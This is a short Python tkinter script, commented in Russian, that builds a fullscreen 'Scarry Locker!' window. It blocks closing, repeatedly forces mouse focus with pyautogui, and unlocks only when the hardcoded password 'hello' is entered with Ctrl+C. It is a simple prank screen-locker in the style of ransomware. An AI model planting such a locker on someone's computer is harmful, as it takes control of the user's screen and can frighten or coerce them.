from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep


def callback(event):
    global k, entry

    if entry.get() == "hello":
        k = True


def on_clossing():
    click(675, 420)
    moveTo(675, 420)
    root.attributes("-fullscreen", True)
    root.protocol("WM_DELETE_WINDOW", on_clossing)
    root.update()
    root.bind('<Control-KeyPress-c>', callback)


root = Tk()     # Создание окна
root.title("Locker")    # Заголок
root.attributes("-fullscreen", True)    # Полноэкранный режим

entry = Entry(root, font=1)     # Поле ввода для пароля
entry.place(width=150, height=50, x=600, y=400)     # Размер и координаты поля

label0 = Label(root, text="Scarry Locker!", font=1)     # Label
label0.grid(row=0, column=0)    # Ячейка

label1 = Label(root, text="Write the password and press ctrl+c", font='Arial 20')   # Сообщение при активации проги
label1.place(x=470, y=300)  # Координаты надписи

root.update()   # Обновление экрана программы
sleep(0.2)
click(675, 420)

k = False

while k is not True:
    on_clossing()
